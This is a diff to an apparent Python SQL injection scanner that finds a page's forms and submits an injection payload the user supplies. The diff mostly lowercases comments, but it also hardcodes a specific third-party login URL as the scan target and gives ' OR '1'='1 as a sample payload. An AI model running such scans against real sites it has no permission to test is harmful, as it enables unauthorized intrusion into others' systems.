@@ -2,16 +2,16 @@ import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin
 
-# Initialize session
+# initialize session
 s = requests.Session()
 s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
 
-# Get all forms from the given URL
+# get all forms from the given URL
 def get_forms(url):
     soup = BeautifulSoup(s.get(url).content, "html.parser")
     return soup.find_all("form")
 
-# Extract details from a form
+# extract details from a form
 def form_details(form):
     details = {}
     action = form.attrs.get("action")
@@ -78,6 +78,7 @@ def sql_injection_scan(url, injection_payload):
             print("\n[+] No SQL injection vulnerability detected.\n")
 
 if __name__ == "__main__":
-    urlToBeChecked = input("Enter target URL (e.g., https://example.com/page): ").strip()
+    #done as input for now so that
+    urlToBeChecked = "https://www.smdservers.net/SLWebSiteTemplate_V2/login.aspx?sCorpCode=dYj5YBEpQDyley1GTfnOig==&sLocationCode=F3e81MY3f4IcaovtqM7F3w==&1=1"
     custom_payload = input("Enter your SQL injection payload (e.g., ' OR '1'='1): ").strip()
     sql_injection_scan(urlToBeChecked, custom_payload)
